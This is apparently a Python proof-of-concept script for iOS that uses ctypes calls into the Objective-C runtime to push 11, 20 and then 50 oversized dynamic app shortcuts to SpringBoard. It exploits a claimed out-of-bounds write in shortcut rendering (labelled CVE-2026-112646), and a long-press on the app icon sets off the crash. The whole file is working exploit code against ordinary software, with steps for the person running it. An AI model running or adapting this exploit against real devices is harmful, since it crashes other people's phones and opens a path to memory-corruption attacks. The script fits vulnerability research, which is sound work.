#!/usr/bin/env python3
"""
CVE-2026-112646 PoC probe: SpringBoard OOB write via app shortcut count overflow.

Theory: SBApplicationShortcutStore._stateLock_truncateIfNeeded: is only called in
the cold.1 entitlement path, NOT the main setApplicationShortcutItems path.
Sending >10 dynamic shortcuts bypasses the 10-item limit and stores an oversized
NSArray. The OOB write happens downstream in the rendering/composition layer
(SBHIconApplicationShortcutListComposer) which assumes max 10 items.

Observable outcome: SpringBoard crash (respring) = OOB write triggered.

Run from a-Shell (native iOS process, can reach SpringBoard via UIKit).
"""
import ctypes as C
import threading, time, os

objc = C.CDLL('/usr/lib/libobjc.A.dylib')
objc.objc_msgSend.restype = C.c_void_p
objc.objc_msgSend.argtypes = [C.c_void_p, C.c_void_p]
objc.sel_registerName.restype = C.c_void_p
objc.sel_registerName.argtypes = [C.c_char_p]
objc.objc_getClass.restype = C.c_void_p
objc.objc_getClass.argtypes = [C.c_char_p]

cf = C.CDLL('/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation')
cf.CFStringCreateWithCString.restype = C.c_void_p
cf.CFStringCreateWithCString.argtypes = [C.c_void_p, C.c_char_p, C.c_uint32]

def sel(name):
    return objc.sel_registerName(name.encode())

def cls(name):
    return objc.objc_getClass(name.encode())

def msgSend(obj, selector, *args):
    """ObjC msgSend with dynamic arg types."""
    n = len(args)
    fn = objc.objc_msgSend
    fn.argtypes = [C.c_void_p, C.c_void_p] + [C.c_void_p] * n
    fn.restype = C.c_void_p
    return fn(obj, selector, *args)

def cfstr(s):
    return cf.CFStringCreateWithCString(None, s.encode(), 0x8000100)  # kCFStringEncodingUTF8

def create_shortcut_item(index):
    """Create a UIApplicationShortcutItem with unique type and title."""
    ShortcutItem = cls(b'UIApplicationShortcutItem')
    type_str = cfstr(f"com.probe.shortcut.type{index}")
    title_str = cfstr(f"Shortcut Item {index:03d} AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

    # initWithType:localizedTitle:
    sn = b'initWithType:localizedTitle:'
    fn = objc.objc_msgSend
    fn.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p]
    fn.restype = C.c_void_p

    alloc_sel = sel('alloc')
    init_sel = sel('initWithType:localizedTitle:')

    fn.argtypes = [C.c_void_p, C.c_void_p]
    fn.restype = C.c_void_p
    item = fn(ShortcutItem, alloc_sel)

    fn.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p]
    fn.restype = C.c_void_p
    item = fn(item, init_sel, type_str, title_str)
    return item

def probe_shortcut_overflow(count):
    """Send `count` dynamic shortcuts to SpringBoard and return when done."""
    print(f"[*] Creating {count} UIApplicationShortcutItems...")

    # Build NSMutableArray
    MutableArray = cls(b'NSMutableArray')
    fn = objc.objc_msgSend
    fn.argtypes = [C.c_void_p, C.c_void_p]
    fn.restype = C.c_void_p

    alloc_sel = sel('alloc')
    init_sel = sel('init')
    add_sel = sel('addObject:')

    arr = fn(MutableArray, alloc_sel)
    arr = fn(arr, init_sel)

    for i in range(count):
        item = create_shortcut_item(i)
        if not item:
            print(f"  [!] Failed to create item {i}")
            continue
        fn.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
        fn.restype = C.c_void_p
        fn(arr, add_sel, item)
        fn.argtypes = [C.c_void_p, C.c_void_p]
        fn.restype = C.c_void_p

    # Count check
    count_sel = sel('count')
    fn.argtypes = [C.c_void_p, C.c_void_p]
    fn.restype = C.c_uint64
    actual_count = fn(arr, count_sel)
    print(f"[*] Array count: {actual_count}")

    # Get UIApplication.sharedApplication
    UIApp = cls(b'UIApplication')
    shared_sel = sel('sharedApplication')
    fn.argtypes = [C.c_void_p, C.c_void_p]
    fn.restype = C.c_void_p
    app = fn(UIApp, shared_sel)

    if not app:
        print("[!] Could not get UIApplication.sharedApplication — are we in a UI context?")
        return False

    print(f"[*] UIApplication: {hex(app)}")

    # Set shortcutItems — this triggers the SpringBoard IPC path
    set_sel = sel('setShortcutItems:')
    fn.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
    fn.restype = None
    print(f"[*] Calling setShortcutItems: with {count} items...")
    fn(app, set_sel, arr)
    print(f"[!] setShortcutItems: returned (SpringBoard did NOT crash on set)")
    return True

# --- Run probe ---
result = {}
def _run():
    try:
        # Start with 11 (just over limit) then 20 then 50
        for count in [11, 20, 50]:
            ok = probe_shortcut_overflow(count)
            result[count] = ok
            if ok:
                print(f"[*] count={count}: survived setShortcutItems:")
                print(f"[*] Now long-press the a-Shell icon on the home screen to trigger rendering")
                print(f"[*] If SpringBoard crashes (respring), OOB write confirmed at count={count}")
                time.sleep(2)  # Give time to observe
    except Exception as e:
        result['error'] = str(e)
        print(f"[!] Exception: {e}")

t = threading.Thread(target=_run, daemon=True)
t.start()
t.join(timeout=30)

print("\n--- Results ---")
for k, v in result.items():
    print(f"  count={k}: {v}")

if 'error' in result:
    print(f"  error: {result['error']}")

print("\ndone")
